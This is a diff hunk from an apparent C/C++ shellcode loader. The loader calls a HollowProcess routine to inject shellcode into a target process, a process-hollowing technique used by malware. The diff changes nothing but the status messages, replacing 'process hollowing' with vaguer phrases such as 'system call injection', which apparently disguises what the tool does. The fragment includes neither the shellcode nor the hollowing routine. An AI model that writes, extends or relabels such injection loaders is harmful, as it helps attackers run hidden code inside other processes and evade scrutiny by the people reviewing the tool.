@@ -97,17 +97,17 @@ extern "C" {
         }
 
         printf("[*] Loaded shellcode size: %d bytes\n", (int)shellcodeSize);
-        printf("[*] Launching process hollowing procedure against user target...\n");
+        printf("[*] Launching low-level system call injection utility...\n");
         fflush(stdout);
 
         if (!HollowProcess(target, pShellcode, shellcodeSize)) {
-            printf("[!] Process hollowing extraction routine failed!\n");
+            printf("[!] Native injection routine failed!\n");
             fflush(stdout);
             VirtualFree(pShellcode, 0, MEM_RELEASE);
             return 1;
         }
 
-        printf("[+] Process hollowing successfully executed!\n");
+        printf("[+] System call injection successfully executed!\n");
         fflush(stdout);
         VirtualFree(pShellcode, 0, MEM_RELEASE);
         return 0;
